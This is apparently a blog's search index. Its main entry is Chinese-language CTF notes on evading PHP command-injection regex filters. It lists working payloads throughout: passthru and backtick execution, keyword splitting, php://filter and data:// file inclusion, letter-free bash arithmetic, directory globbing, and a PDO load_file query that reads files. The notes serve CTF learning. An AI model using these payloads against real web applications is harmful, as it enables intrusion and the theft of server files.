<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>Nirvana</title>
    <url>/2021/10/06/Nirvana/</url>
    <content><![CDATA[<p><font size=5><center>Welcome to my world!</center></font></p>
]]></content>
      <tags>
        <tag>Markdown</tag>
      </tags>
  </entry>
  <entry>
    <title>Command</title>
    <url>/2021/10/06/Command/</url>
    <content><![CDATA[<blockquote>
<p>if(!preg_match(“/flag|system|php/i”, $c)){</p>
</blockquote>
<p>&ensp;<strong>过滤了文件名，系统命令执行函数，php</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&#x27;ls&#x27;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;nl fl&#x27;&#x27;ag.ph&#x27;&#x27;p&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo `nl fl&#x27;&#x27;ag.p&#x27;&#x27;hp`;</span><br></pre></td></tr></table></figure>
<blockquote>
<p>if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;/i”, $c)){</p>
</blockquote>
<p>&ensp;<strong>过滤了文件名、system、php、cat、sort、shell、点号、空格、单引号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;ls&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=passthru(&quot;nl%09`ls`&quot;);</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(pos(localeconv())))));</span><br></pre></td></tr></table></figure>
<blockquote>
<p>if(!preg_match(“/flag|system|php|cat|sort|shell|.| |&#39;|`|echo|;|(/i”, $c)){</p>
</blockquote>
<p>&ensp;<strong>过滤了flag、system、php、cat、sort、shell、点号、空格、单引号、反引号、echo、；、左括号</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[1]?&gt;&amp;1=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class="line">?c=$nice=include$_GET[&quot;url&quot;]?&gt;&amp;url=php://filter/read=convert.base64- encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<p>&ensp;<strong>先闭合，再写php代码</strong></p>
<blockquote>
<p>过滤数字时</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>
<blockquote>
<p>利用文件包含</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?c=data://text/plain;base64, PD9waHAgaW5jbHVkZSgnZmxhZy5waHAnKTtlY2hvICRmbGFnPz4=</span><br></pre></td></tr></table></figure>
<blockquote>
<p>过滤了字母、数字、分号、2个通配符</p>
</blockquote>
<ul>
<li>echo ${_} #返回上一次的执行结果</li>
<li>echo $(()) #0</li>
<li>echo $((<del>$(()))) #</del>0是-1</li>
<li>$(($((<del>$(())))$((</del>$(()))))) #$((-1-1))即$$((-2))是-2</li>
<li>echo $((<del>-37)) #</del>-37是36**</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure>
<blockquote>
<p>将缓冲区数据获取给$s,再清楚,然后将数字小写字母全变为?</p>
</blockquote>
<ul>
<li>这里通过exit();使程序提前退出，绕过后面的正则表达式</li>
<li>payload:<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=include(&#x27;/flag.txt&#x27;);exit(0);</span><br></pre></td></tr></table></figure>
<blockquote>
<p>scandir被禁用,使用DirectoryIterator类</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $key=&gt;$value)&#123;echo $key.&quot;=&gt;&quot;.$value;&#125;;exit(0);?&gt;</span><br></pre></td></tr></table></figure>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&gt; 用sql语句读取数据库文件</span><br></pre></td></tr></table></figure>
c=try {<br />$dbh = new PDO(‘mysql:host=localhost;dbname=ctftraining’, ‘root’,<br />‘root’);<br />foreach ($dbh-&gt;query(‘select load_file(“/flag36.txt”)’) as $row) {<br />echo ($row[0]) . “|”;<br />}<br />$dbh = null;<br />} catch (PDOException $e) {<br />echo $e-&gt;getMessage();<br />exit(0);<br />}<br />exit(0);<br>```</li>
</ul>
]]></content>
      <categories>
        <category>信息安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
</search>
